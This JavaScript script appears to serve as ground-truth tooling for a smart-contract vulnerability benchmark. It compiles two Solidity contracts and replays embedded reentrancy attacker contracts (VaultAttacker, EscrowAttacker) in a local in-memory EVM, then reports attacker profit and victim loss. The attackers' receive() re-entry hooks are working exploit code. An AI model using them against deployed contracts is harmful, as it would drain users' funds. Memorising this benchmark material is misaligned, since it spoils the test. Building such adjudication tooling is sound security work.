// Usage: node adjudicate-heldout3.mjs <heldout3 contracts dir> [out.json]
// GROUND-TRUTH ADJUDICATION of the two corpus-3 reentrancy labels the execution validator disputed (EtherShareVault.redeem,
// MerchantEscrow.release). The ORIGINAL contracts are compiled unchanged with solc and executed in a local JS EVM, together with explicit
// attacker contracts. Each attack is compared with the honest sequence of the same calls. No network; nothing outside the in-memory EVM.
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { Chain, ETHER, compile, encodeCall } from "./lib.mjs";

const dir = process.argv[2]; const outPath = process.argv[3];
const fmt = (w) => `${Number(w) / 1e18} ether`;
const strip = (src) => src.replace(/^\/\/ SPDX-License-Identifier:.*$/m, "").replace(/^pragma solidity[^;]*;/m, "");

const VAULT_ATTACKER = `
contract VaultAttacker {
    EtherShareVault public v; bool armed; bool nestRedeem;
    constructor(address payable t) { v = EtherShareVault(t); }
    function enter() external payable { v.deposit{value: msg.value}(); }
    /// cross-function: redeem, and while the shares are not yet burned re-enter deposit() with the ether just received
    function attackDeposit(uint256 shares) external { armed = true; v.redeem(shares); armed = false; }
    /// same-function: redeem, and re-enter redeem() with the same shares
    function attackRedeem(uint256 shares) external { nestRedeem = true; v.redeem(shares); nestRedeem = false; }
    function honestCycle(uint256 shares) external { v.redeem(shares); v.deposit{value: address(this).balance}(); }
    function exitAll() external { v.redeem(v.sharesOf(address(this))); }
    receive() external payable {
        if (armed) { armed = false; v.deposit{value: msg.value}(); }
        else if (nestRedeem) { nestRedeem = false; v.redeem(v.sharesOf(address(this))); }
    }
}`;
const ESCROW_ATTACKER = `
contract EscrowAttacker {
    MerchantEscrow public e; uint256 reenter;
    constructor(address t) { e = MerchantEscrow(t); }
    function attack(uint256 times) external { reenter = times; e.release(); }
    function honest() external { e.release(); }
    receive() external payable { if (reenter > 0) { reenter--; e.release(); } }
}`;

function build(file, extra) {
  const text = readFileSync(join(dir, file), "utf8") + "\n" + extra;
  const b = compile(file, text); if (b.errors.length) throw new Error(b.errors.join("\n")); return b;
}
const addrArg = (a) => "0x" + a.toString().replace(/^0x/, "").padStart(64, "0");
const ctor = (a) => Uint8Array.from(Buffer.from(addrArg(a).slice(2), "hex"));

async function vault(mode, attackerCredit, rounds) {
  const b = build("EtherShareVault.sol", VAULT_ATTACKER); const V = b.contracts.EtherShareVault, A = b.contracts.VaultAttacker;
  const chain = await Chain.create(); const dep = chain.addr(0xde1), victim = chain.addr(0x71c), atkEoa = chain.addr(0xa77);
  for (const x of [dep, victim, atkEoa]) await chain.fund(x, 1000n * ETHER);
  const vault = await chain.deploy(V.bytecode, dep); const atk = await chain.deploy(A.bytecode, dep, ctor(vault));
  const log = [];
  const call = async (from, to, abi, fn, args = [], value = 0n) => { const r = await chain.call(from, to, encodeCall(abi, fn, args), value); log.push(`${fn}(${args.join(",")})${value ? ` value ${fmt(value)}` : ""}: ${r.ok ? "ok" : "REVERT " + r.error}`); return r; };
  await call(victim, vault, V.abi, "deposit", [], 10n * ETHER);
  await call(atkEoa, atk, A.abi, "enter", [], attackerCredit * ETHER);
  for (let i = 0; i < rounds; i++) {
    const shares = BigInt("0x" + (await chain.call(dep, vault, encodeCall(V.abi, "sharesOf", [atk.toString()]))).returnData.slice(2) || "0");
    if (mode === "cross-function") await call(atkEoa, atk, A.abi, "attackDeposit", [shares]);
    else if (mode === "same-function") await call(atkEoa, atk, A.abi, "attackRedeem", [shares]);
    else await call(atkEoa, atk, A.abi, "honestCycle", [shares]);
  }
  await call(atkEoa, atk, A.abi, "exitAll");
  const atkOut = await chain.balance(atk);
  const victimShares = BigInt((await chain.call(dep, vault, encodeCall(V.abi, "sharesOf", [victim.toString()]))).returnData);
  const victimBefore = await chain.balance(victim); await call(victim, vault, V.abi, "redeem", [victimShares]);
  const victimOut = (await chain.balance(victim)) - victimBefore;
  return { contract: "EtherShareVault", mode, attackerCredit: fmt(attackerCredit * ETHER), rounds, attackerEndsWith: fmt(atkOut), attackerProfit: fmt(atkOut - attackerCredit * ETHER), victimRecovers: fmt(victimOut), victimLoss: fmt(10n * ETHER - victimOut), log };
}

async function escrow(mode, attackerPaid, othersPaid, times) {
  const b = build("MerchantEscrow.sol", ESCROW_ATTACKER); const E = b.contracts.MerchantEscrow, A = b.contracts.EscrowAttacker;
  const chain = await Chain.create(); const dep = chain.addr(0xde1), buyer = chain.addr(0xb0b), merchant = chain.addr(0x3e3), collector = chain.addr(0xc011), atkEoa = chain.addr(0xa77);
  for (const x of [dep, buyer, atkEoa]) await chain.fund(x, 1000n * ETHER);
  const esc = await chain.deploy(E.bytecode, dep, ctor(collector)); const atk = await chain.deploy(A.bytecode, dep, ctor(esc));
  const log = [];
  const call = async (from, to, abi, fn, args = [], value = 0n) => { const r = await chain.call(from, to, encodeCall(abi, fn, args), value); log.push(`${fn}(${args.map(String).join(",")})${value ? ` value ${fmt(value)}` : ""}: ${r.ok ? "ok" : "REVERT " + r.error}`); return r; };
  await call(buyer, esc, E.abi, "pay", [merchant.toString()], othersPaid * ETHER);
  await call(atkEoa, esc, E.abi, "pay", [atk.toString()], attackerPaid * ETHER);
  const entitled = BigInt((await chain.call(dep, esc, encodeCall(E.abi, "escrowOf", [atk.toString()]))).returnData);
  const r = mode === "reentrant" ? await call(atkEoa, atk, A.abi, "attack", [BigInt(times)]) : await call(atkEoa, atk, A.abi, "honest");
  const got = await chain.balance(atk);
  const merchantEntitled = BigInt((await chain.call(dep, esc, encodeCall(E.abi, "escrowOf", [merchant.toString()]))).returnData);
  const mr = await call(merchant, esc, E.abi, "release");
  return { contract: "MerchantEscrow", mode, attackerPaidIn: fmt(attackerPaid * ETHER), othersPaidIn: fmt(othersPaid * ETHER), nestedReleases: mode === "reentrant" ? times : 0, attackerEntitled: fmt(entitled), attackerReceived: fmt(got), attackTx: r.ok ? "succeeded" : "reverted", merchantEntitled: fmt(merchantEntitled), merchantRelease: mr.ok ? "succeeded" : `REVERTS (${mr.error}): funds gone`, contractBalanceAfter: fmt(await chain.balance(esc)), log };
}

const results = [];
for (const credit of [1n, 2n]) for (const mode of ["honest", "same-function", "cross-function"]) results.push(await vault(mode, credit, 1));
results.push(await vault("cross-function", 2n, 5));
for (const [mode, times] of [["honest", 0], ["reentrant", 1], ["reentrant", 3]]) results.push(await escrow(mode, 2n, 10n, times));
results.push(await escrow("reentrant", 2n, 1n, 1)); // others hold less than the attacker: the checked subtraction stops it
for (const r of results) { const { log, ...rest } = r; console.log(JSON.stringify(rest)); }
if (outPath) writeFileSync(outPath, JSON.stringify({ tool: "eval/ground-truth/adjudicate-heldout3.mjs", evm: "@ethereumjs/evm (shanghai), solc " + compile("x.sol", "pragma solidity ^0.8.0; contract X{}").solcVersion, results }, null, 2) + "\n");
